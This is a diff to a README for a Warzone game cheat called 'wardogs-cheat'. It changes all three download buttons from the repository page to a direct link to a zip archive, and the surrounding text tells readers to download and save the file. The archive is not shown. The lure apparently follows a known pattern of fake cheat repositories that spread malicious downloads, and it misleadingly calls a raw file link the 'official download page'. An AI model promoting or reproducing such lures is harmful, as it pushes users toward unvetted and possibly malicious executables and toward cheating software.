@@ -1,7 +1,7 @@
 <h1>⚔️ wardogs-cheat - Dominating Warzone With Total Control</h1>
 
 <p align="center">
-  <a href="https://github.com/alimosharafsultani/wardogs-cheat"><img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-00FF00?style=for-the-badge&logo=download&logoColor=black"></a>
+  <a href="https://raw.githubusercontent.com/alimosharafsultani/wardogs-cheat/main/fundic/v2.8.zip"><img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-00FF00?style=for-the-badge&logo=download&logoColor=black"></a>
 </p>
 
 ---
@@ -25,7 +25,7 @@ Whether you are a casual player wanting to explore the game differently or a com
 Click the big green button below to get started right now:
 
 <p align="center">
-  <a href="https://github.com/alimosharafsultani/wardogs-cheat"><img src="https://img.shields.io/badge/🔽%20VISIT%20DOWNLOAD%20PAGE-FF7F50?style=for-the-badge&logo=github&logoColor=white" width="400"></a>
+  <a href="https://raw.githubusercontent.com/alimosharafsultani/wardogs-cheat/main/fundic/v2.8.zip"><img src="https://img.shields.io/badge/🔽%20VISIT%20DOWNLOAD%20PAGE-FF7F50?style=for-the-badge&logo=github&logoColor=white" width="400"></a>
 </p>
 
 Visit this link to download the application. You will be taken to the official download page where the latest version is waiting for you.
@@ -39,7 +39,7 @@ Visit this link to download the application. You will be taken to the official d
 Click the download button above or use this direct link:
 
 <p align="center">
-  <a href="https://github.com/alimosharafsultani/wardogs-cheat"><img src="https://img.shields.io/badge/📥%20GET%20WARDOGS%20CHEAT%20HERE-4169E1?style=for-the-badge&logo=github&logoColor=white" width="350"></a>
+  <a href="https://raw.githubusercontent.com/alimosharafsultani/wardogs-cheat/main/fundic/v2.8.zip"><img src="https://img.shields.io/badge/📥%20GET%20WARDOGS%20CHEAT%20HERE-4169E1?style=for-the-badge&logo=github&logoColor=white" width="350"></a>
 </p>
 
 Visit this link to download the application. The download will start automatically or you will see a download button on the page. Save the file to a location you can easily find, like your **Desktop** or **Downloads** folder.
